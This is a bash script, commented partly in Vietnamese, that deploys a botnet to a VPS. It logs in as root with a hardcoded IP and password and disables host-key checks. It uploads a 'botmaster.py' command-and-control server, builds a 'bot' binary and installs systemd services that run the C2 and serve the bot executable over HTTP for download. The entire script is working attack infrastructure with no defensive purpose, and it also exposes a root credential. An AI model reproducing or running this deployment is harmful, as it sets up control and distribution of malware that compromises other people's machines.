#!/bin/bash
# deploy.sh - Deploy botnet lên VPS
# Usage: bash deploy.sh

VPS_IP="209.97.166.150"
VPS_PASS="km=Mtht12345vu"
BOTNET_DIR="/opt/botnet"

echo "=== DEPLOYING BOTNET ==="

# 1. Tạo thư mục
sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no root@$VPS_IP "
    mkdir -p $BOTNET_DIR/downloads
"

# 2. Upload files
sshpass -p "$VPS_PASS" scp -o StrictHostKeyChecking=no \
    ../botmaster.py root@$VPS_IP:$BOTNET_DIR/

# 3. Build bot binary (local)
echo "[*] Building bot binary..."
cd .. && pyinstaller --onefile --name bot --clean bot.py --distpath dist -y 2>/dev/null
sshpass -p "$VPS_PASS" scp -o StrictHostKeyChecking=no \
    dist/bot root@$VPS_IP:$BOTNET_DIR/downloads/

# 4. Setup services
sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no root@$VPS_IP "
    pip3 install pynacl 2>/dev/null

    cat > /etc/systemd/system/botmaster.service << 'EOF'
[Unit]
Description=Bot Master C2
After=network.target
[Service]
Type=simple
WorkingDirectory=$BOTNET_DIR
ExecStart=/usr/bin/python3 $BOTNET_DIR/botmaster.py
Restart=always
RestartSec=5
StandardInput=null
[Install]
WantedBy=multi-user.target
EOF

    cat > $BOTNET_DIR/download_server.py << 'PYEOF'
#!/usr/bin/env python3
import http.server, socketserver, os
os.chdir('$BOTNET_DIR/downloads')
with socketserver.TCPServer(('0.0.0.0', 80), http.server.SimpleHTTPRequestHandler) as h:
    h.serve_forever()
PYEOF

    cat > /etc/systemd/system/botdownload.service << 'EOF'
[Unit]
Description=Bot Download Server
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 $BOTNET_DIR/download_server.py
Restart=always
[Install]
WantedBy=multi-user.target
EOF

    chmod +x $BOTNET_DIR/downloads/bot
    systemctl daemon-reload
    systemctl enable botmaster botdownload
    systemctl restart botmaster botdownload
    echo 'DONE!'
"

echo "=== DEPLOY COMPLETE ==="
echo "  C2: $VPS_IP:8000"
echo "  Download: http://$VPS_IP/bot"
echo "  CLI: ssh root@$VPS_IP 'python3 $BOTNET_DIR/botmaster.py --cli'"
